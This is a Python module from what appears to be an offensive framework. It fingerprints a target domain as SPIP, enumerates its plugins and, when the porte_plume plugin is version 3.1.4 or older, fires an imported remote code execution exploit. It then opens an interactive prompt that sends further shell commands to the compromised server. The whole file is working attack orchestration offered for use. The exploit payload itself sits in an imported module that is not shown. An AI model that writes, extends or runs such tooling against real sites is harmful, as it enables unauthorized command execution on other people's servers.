import logging
from hmc.modules import Workflow, Argument
from hmc.modules.spip.detect import SPIPDetect
from hmc.modules.spip.detect_plugins import SPIPDetectPlugins
from hmc.modules.spip.plume_rce import SPIPPortePlumeRCE

log = logging.getLogger("hmc")

class SPIPAnalyzer(Workflow):
    module_name = "spip_analyzer"
    module_desc = "Auto-detect SPIP + Plugins + CVE"
    module_auth = "wayko"

    module_args = [
        Argument("domain", desc="Target domain (e.g., http://example.com)"),
        Argument("cmd", "-c", "--cmd", desc="Command to execute (RCE)", default="id"),
    ]
    
    def init_modules(self):
        self.exec_rce = True

        self.add_module(
            SPIPDetect(),
            entries={ 'domain': 'domain' },
            outputs={
                'is_spip': 'result'
            }
        )

        self.add_module(
            SPIPDetectPlugins(),
            entries={ 'domain': 'url' },
            outputs={ 'plugin': 'plugin' },
            condition=(['is_spip'], lambda s: s is True)
        )

        self.add_module(
            SPIPPortePlumeRCE(),
            entries={
                'domain': 'url',
                'cmd': 'cmd',
            },
            outputs={ 'result_rce': 'plume_rce' },
            condition=(['is_spip', 'plugin'], lambda s, p: s == True and p['name'] == 'porte_plume' and p['version'] <= '3.1.4')
        )

    async def execute(self, domain, cmd='id', shell=False):
        self.exec_rce = shell

        self.get_hub("cmd").write(cmd, eof=not shell)
        self.get_hub("domain").write_eof(domain)
        
        await self.wait_until_done()
        # if self.rce_output is not None:
        #     print(self.rce_output)
        # else: 
        #     print(f"RCE fail")

    def data_received(self, pipe, data):
        if pipe == "result_rce":
            if data:
                print(data)
            if not self.exec_rce:
                return

            user_cmd = ""
            while not user_cmd:
                user_cmd = input("> ")
                if user_cmd == "exit":
                    self.exec_rce = False
                    self.get_hub("cmd").write_eof()
                    print("END OF RCE")
                    return
            self.get_hub("cmd").write(user_cmd)


